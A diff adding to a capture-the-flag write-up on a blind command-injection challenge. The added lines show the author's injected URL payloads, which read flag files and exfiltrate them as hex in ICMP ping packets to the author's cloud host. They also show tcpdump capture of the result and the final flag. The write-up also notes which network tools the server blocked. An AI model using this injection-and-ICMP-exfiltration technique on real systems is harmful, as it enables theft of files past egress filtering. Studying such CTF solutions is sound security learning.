@@ -23,8 +23,40 @@ Alright so after spending enought time, I was able to figure out below things:
 - OS Commands were being executed on the server side but it was not reflecting back in response. 
 - Server was also not accepting few utilities/commands like `wget`,`hping3`,`scappy`,`curl`,`http` and many more however it was accepting ping command so I need to read the flag file using some command and send that flag to my server through ICMP packet.
 
-Before I execute any command blindly on CTF server, I thought to try few ICMP packet with some data to my cloud server.  
+Before I execute any command blindly on CTF server, I thought to send few ICMP packets with some data to my cloud server.  
 
 ![Alt text](https://github.com/sagarpopat/CTF-wirteup/blob/master/images/ping_req.PNG "Optional Title") 
+
+I quickly crafted command which will first read flag1 file and send that through ICMP packet. Below was my final attempt to read flagpart1.txt file:
+ 
+    http://54.89.146.217/index.php?cmd=ping ec2-35-166-203-92.us-west-2.compute.amazonaws.com -p $(xxd -p /home/nullcon/flagpart1.txt)
+
+Reading ICMP packets on my server using tcpdump
+   
+  ![Alt text](https://github.com/sagarpopat/CTF-wirteup/blob/master/images/flag1.PNG "Optional Title") 
+
+Flag 1 from flagpart1.txt was '0omgth4t'. 
+
+Reading flagpart2.txt file: 
+   
+    http://54.89.146.217/index.php?cmd=ping ec2-35-166-203-92.us-west-2.compute.amazonaws.com -p $(xxd -p /home/nullcon/flagpart2.txt)
+
+Reading ICMP packets on my server using tcpdump
+
+    ![Alt text](https://github.com/sagarpopat/CTF-wirteup/blob/master/images/flag2.PNG "Optional Title") 
+
+Flag 2 from flagpart2.txt was 'aniceflag'. 
+   
+and our final flag(flagpart1+flagpart2) is
+   
+      flag{0omgth4taniceflag}
+    
+## Credits
+- Shubham Mittal
+- Sanjog Panda
+- Archita Aparichita
+- Pratap Chandra
+- Chandrakant Nial
+- Swaroop Yermalkar
 
 
